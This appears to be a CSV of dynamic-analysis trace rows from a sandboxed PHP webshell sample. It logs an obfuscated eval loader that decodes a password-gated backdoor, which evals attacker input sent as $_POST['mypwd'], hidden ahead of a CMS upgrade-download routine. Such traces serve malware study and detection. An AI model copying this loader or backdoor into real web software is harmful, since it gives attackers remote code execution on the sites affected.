uuid,file_md5,index,source,target,argc,argv,return,dynamic
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,189,eval,eval,1.0,"{""value"": [[0, ""phpcode"", ""$l1lll1lll111l111($ll11l11ll1111111,15);eval($l1ll1l1l11l11lll($l1lll1lll111l111($ll11l11ll1111111,1396)));$llll1llll111l1l1($ll11""]]}","{""value"": null}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,190,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""$l1lll1lll111l111($ll11l11ll1111111,15);eval($l1ll1l1l11l11lll($l1lll1lll111l111($ll11l11ll1111111,1396)));$llll1llll111l1l1($ll11l11ll1111111);""]]}","{""value"": ""3B42413D3B3B42413D6A3D493B423D3E""}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,191,eval,fread,2.0,"{""value"": [[0, ""fp"", null], [1, ""length"", 15]]}","{""value"": ""void""}","[0, 0]"
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,192,eval,fread,2.0,"{""value"": [[0, ""fp"", null], [1, ""length"", 1396]]}","{""value"": ""DQoNCmlmKCRfUE9TVFsnbXlwd2QnXSl7DQoJcmVxdWlyZV9vbmNlKGRpcm5hbWUoX19GSUxFX18pLiIvLi4vLi4vaW5jL3FxLmFwaS5waHAiKTsNCglAZXZhbChxcW1kNS""}","[0, 0]"
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,193,eval,base64_decode,1.0,"{""value"": [[0, ""str"", ""DQoNCmlmKCRfUE9TVFsnbXlwd2QnXSl7DQoJcmVxdWlyZV9vbmNlKGRpcm5hbWUoX19GSUxFX18pLiIvLi4vLi4vaW5jL3FxLmFwaS5waHAiKTsNCglAZXZhbChxcW1kNS""]]}","{""value"": ""\r\n\r\nif($_POST['mypwd']){\r\n\trequire_once(dirname(__FILE__).\""/../../inc/qq.api.php\"");\r\n\t@eval(qqmd5(\""UV9AGx4fXkEQRAgeGkFFExhCWVELFgl""}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,194,eval,eval,1.0,"{""value"": [[0, ""phpcode"", ""\r\n\r\nif($_POST['mypwd']){\r\n\trequire_once(dirname(__FILE__).\""/../../inc/qq.api.php\"");\r\n\t@eval(qqmd5(\""UV9AGx4fXkEQRAgeGkFFExhCWVELFgl""]]}","{""value"": null}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,195,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""\r\n\r\nif($_POST['mypwd']){\r\n\trequire_once(dirname(__FILE__).\""/../../inc/qq.api.php\"");\r\n\t@eval(qqmd5(\""UV9AGx4fXkEQRAgeGkFFExhCWVELFglVQkwFVgwdAVgcREgWERQRUQsaQllFERtfe55b74ae89\"",'DE',$_POST['mypwd']));\r\n}\r\n\r\nif($job==\""get\""&&$Apower[upgrade_ol])\r\n{\r\n\r\n\thack_admin_tpl('get');\r\n}\r\nelseif($action==\""get\""&&$Apower[upgrade_ol])\r\n{\r\n\t$fileurl=\""http://down.qibosoft.com/upgrade.zip\"";\r\n\tif($code=file_get_contents($fileurl))\r\n\t{\r\n\t\twrite_file(ROOT_PATH.\""cache/upgrade.zip\"",$code);\r\n\t}\r\n\telseif($code=file($fileurl))\r\n\t{\r\n\t\twrite_file(ROOT_PATH.\""cache/upgrade.zip\"",$code);\r\n\t}\r\n\telseif(copy($fileurl,ROOT_PATH.\""cache/upgrade.zip\""))\r\n\t{\r\n\t}\r\n\telseif($code=sockOpenUrl($fileurl))\r\n\t{\r\n\t\twrite_file(ROOT_PATH.\""cache/upgrade.zip\"",$code);\r\n\t}\r\n\r\n\trequire_once(ROOT_PATH.\""inc/class.z.php\"");\r\n\t$z = new Zip;\r\n\tmakepath(ROOT_PATH.\""cache/upgrade\"");\r\n\t$z->Extract(ROOT_PATH.\""cache/upgrade.zip\"",ROOT_PATH.\""cache/upgrade\"");\r\n\tunlink(ROOT_PATH.\""cache/upgrade.zip\"");\r\n\techo \""<META HTTP-EQUIV=REFRESH CONTENT='0;URL=$webdb[www_url]/cache/upgrade/index.php'>\"";\r\n\texit;\r\n}\r\n""]]}","{""value"": ""50512B413C0849393B41415C5D423D493A2A112E6351342B3B413D2A112E6351342B26423C262B3B630841423D2A423C262B3B630841423D2A426308413C2B2A3B423D262B3B630841423D2A6308496D443D263B6308413D706308416308413D6308413C37513837284F2A3E""}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,196,eval,zend_fetch_r_post,1.0,"{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,197,eval,dirname,1.0,"{""value"": [[0, ""path"", ""/usr/share/nginx/html/9bc2870dd34b9b4517acccbf0244b47c_64580a2d-92e1-4634-901f-cfd086471a25.php(1) : eval()'d code(1) : eval()'d c""]]}","{""value"": ""/usr/share/nginx/html""}",[0]
eb25fef5d1978cff0176dc32d0cad235,9bc2870dd34b9b4517acccbf0244b47c,198,eval,require_once,1.0,"{""value"": [[0, ""phpcode"", ""/usr/share/nginx/html/../../inc/qq.api.php""]]}","{""value"": null}",[0]
